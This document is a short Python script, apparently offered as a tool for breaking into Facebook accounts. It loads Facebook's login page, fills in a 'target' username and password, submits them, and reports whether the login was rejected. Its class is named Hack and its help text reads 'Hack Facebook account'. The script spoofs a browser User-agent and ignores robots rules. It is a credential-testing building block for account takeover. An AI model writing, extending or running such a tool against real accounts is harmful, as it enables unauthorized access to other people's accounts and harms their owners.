import argparse
import mechanize
from bs4 import BeautifulSoup

class Hack():
    def __init__(self, username, password, url):
        self.__username = username
        self.__password = password
        self.__url = url


    def _get_website(self):
        br = mechanize.Browser()

        br.set_handle_robots(False)
        br.set_handle_refresh(False)
        
        br.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")]

        response = br.open(self.__url)

        self.__start_hacking(br, response)
    

    def __start_hacking(self, br, response):
        br.form = list(br.forms())[0]

        email_control = br.form.find_control("email")
        password_control = br.form.find_control("pass")

        email_control.value = self.__username
        password_control.value = self.__password

        response = br.submit()

        soup = BeautifulSoup(response,'html.parser')

        element = soup.find("h2", string="Your Request Couldn't be Processed")

        if element:
            print("[-] " + element.text)
        else:
            print("OK")

        

def start():
    parser = argparse.ArgumentParser(description="Hack Facebook account")

    parser.add_argument("-username", type=str, help="Username of the target")
    parser.add_argument("-password", type=str, help="Password of the target")

    args = parser.parse_args()

    hack = Hack(username=args.username, password=args.password, url="https://www.facebook.com")
    hack._get_website()


start()